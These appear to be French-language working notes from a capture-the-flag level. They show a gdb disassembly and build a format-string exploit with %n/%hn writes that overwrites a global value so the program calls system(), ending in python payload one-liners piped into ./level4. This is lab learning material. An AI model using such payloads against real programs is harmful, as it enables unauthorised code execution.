(gdb) disas n
Dump of assembler code for function n:
   0x08048457 <+0>:     push   %ebp
   0x08048458 <+1>:     mov    %esp,%ebp
   0x0804845a <+3>:     sub    $0x218,%esp
   0x08048460 <+9>:     mov    0x8049804,%eax
   0x08048465 <+14>:    mov    %eax,0x8(%esp)
   0x08048469 <+18>:    movl   $0x200,0x4(%esp)
   0x08048471 <+26>:    lea    -0x208(%ebp),%eax
   0x08048477 <+32>:    mov    %eax,(%esp)
   0x0804847a <+35>:    call   0x8048350 <fgets@plt>
   0x0804847f <+40>:    lea    -0x208(%ebp),%eax
   0x08048485 <+46>:    mov    %eax,(%esp)
   0x08048488 <+49>:    call   0x8048444 <p>
   0x0804848d <+54>:    mov    0x8049810,%eax
   0x08048492 <+59>:    cmp    $0x1025544,%eax
   0x08048497 <+64>:    jne    0x80484a5 <n+78>
   0x08048499 <+66>:    movl   $0x8048590,(%esp)
   0x080484a0 <+73>:    call   0x8048360 <system@plt>
   0x080484a5 <+78>:    leave  
   0x080484a6 <+79>:    ret    

   Dump of assembler code for function p:
   0x08048444 <+0>:     push   %ebp
   0x08048445 <+1>:     mov    %esp,%ebp
   0x08048447 <+3>:     sub    $0x18,%esp
   0x0804844a <+6>:     mov    0x8(%ebp),%eax
   0x0804844d <+9>:     mov    %eax,(%esp)
   0x08048450 <+12>:    call   0x8048340 <printf@plt>
   0x08048455 <+17>:    leave  
   0x08048456 <+18>:    ret    

Dump of assembler code for function main:
   0x080484a7 <+0>:     push   %ebp
   0x080484a8 <+1>:     mov    %esp,%ebp
   0x080484aa <+3>:     and    $0xfffffff0,%esp
   0x080484ad <+6>:     call   0x8048457 <n>
   0x080484b2 <+11>:    leave  
   0x080484b3 <+12>:    ret  

b *n+59

Encore un exploit printf ? 

Modifier le retour de printf n'a pas l'air d'etre la solution car il y a un return system dans n()
Peut etre modifier les valeurs de la stack frame d'avant p() ?

stack modifier dans p() a 0xbffff520
Saved eip de p : 0x804848d

Donc la valeur a l'adresse 0x8049810 est mise dans eax
Ensuite il y a une cmp entre eax et la valeur immediate $0x1025544

On va devoir modifier la valeur a l'adresse 0x8049810
Sachant que la valeur est ~16 millions, peu de chance qu'on puisse ecrire 16m de char pour renvoyer la valeur ecrite par printf
Il va falloir trouver une autre solution

Ecrire avec cette notation : %XXXXd. Cela génère un entier de taille XXXX.
0x0102 5544 == d16930116

r < <(python -c "print '\x10\x98\x04\x08' + '%16930116c' + '%14$n'")

Ecrire en plusieurs parties avec %hn ? (write short 2 bytes)
Écrire 0x5544 à l'adresse 0x8049810
Écrire 0x0102 à l'adresse 0x8049812

r < <(python -c 'print "\x12\x98\x04\x08" + "\x10\x98\x04\x08" + "%250d" + "%12$hn" + "%21570d" + "%13$hn"')

(python -c 'print "\x10\x98\x04\x08" + "%16930112d" + "%12$n"' ; cat) | ./level4


(python -c 'print "\x12\x98\x04\x08" + "\x10\x98\x04\x08" + "%250d" + "%12$hn" + "%21570d" + "%13$hn"'; cat) | ./level4
